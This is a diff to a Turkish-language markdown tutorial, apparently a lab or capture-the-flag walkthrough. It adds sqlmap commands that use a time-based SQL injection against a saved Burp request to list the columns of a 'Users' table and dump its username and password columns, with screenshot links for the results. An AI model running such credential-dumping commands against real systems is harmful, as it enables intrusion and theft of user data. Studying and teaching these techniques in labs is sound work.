@@ -97,3 +97,17 @@ Veritabanı isimlerine bakıldığında Webapp adlı veritabanının bilgileri �
 
 Tek tablo olan Users tablosunun içerisindeki kolonları çekmeye başlayalım ama önce kolon içerisindeki verileri çekmek için kolon isimlerini öğrenelim.
 
+<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users --columns</code>
+![19](https://user-images.githubusercontent.com/32979760/115159674-ffb00480-a09c-11eb-9055-972398caaeff.PNG)
+
+burada bize lazım olan username ve password kolonları olduğu için oradaki verileri çekmeye başlıyoruz.
+
+<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users -C username --dump </code>
+  
+![20](https://user-images.githubusercontent.com/32979760/115159839-c75cf600-a09d-11eb-9e06-8a69ee243808.PNG)
+
+username bilgilerini çektik şimdi password bilgilerini çekelim.
+
+<code>sqlmap -r burpresult.txt --dbms mysql --technique T -D Webapp -T Users -C password --dump </code>
+
+
